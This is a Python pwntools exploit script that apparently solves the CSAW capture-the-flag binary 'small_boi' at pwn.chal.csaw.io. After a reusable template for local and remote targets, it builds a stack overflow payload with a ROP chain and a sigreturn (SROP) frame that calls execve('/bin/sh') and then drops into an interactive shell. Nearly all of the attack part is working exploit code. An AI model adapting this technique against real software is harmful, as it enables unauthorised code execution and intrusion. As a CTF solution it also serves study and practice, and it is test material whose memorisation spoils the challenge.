#!/usr/bin/env python2.7

import argparse
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = './small_boi'
libc = None
host = 'pwn.chal.csaw.io'
port = 1002

# ====================================================================
#   GLOBALS
# ====================================================================

T      = None      # The Target
LIBC   = None      # Libc ELF
BINARY = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================

def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BINARY = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    POP_RAX  = 0x40018a  # pop rax ; ret
    SYSCALL  = 0x4001c5  # syscall ; nop ; pop rbp ; ret
    BIN_SH   = 0x4001ca  # "/bin/sh"
    READ_200 = 0x400194  # read(0, rax, 0x200)
    SROPADDR = 0x6012d0  # inside .data section

    # SROP chain to trigger execve("/bin/sh", NULL, NULL)
    frame = pwn.SigreturnFrame(arch='amd64')
    frame.rax = 59  # SYS_execve
    frame.rdi = BIN_SH
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = SROPADDR
    frame.rip = SYSCALL

    # (1) ROP chain to trigger another read, this time we will change the value of
    # RAX so it points to the .data section. We will achieve a read(0, rax, 0x200).

    # (2) Write the fake frame in the .data section and perform a SIGRETURN.

    padding = 'A' * 0x28
    payload = padding + pwn.p64(POP_RAX) + pwn.p64(SROPADDR) + pwn.p64(READ_200) + 'A' * 8
    payload += pwn.p64(POP_RAX) + pwn.p64(0xf) + pwn.p64(SYSCALL) + str(frame)

    T.sendline(payload)
    T.interactive()
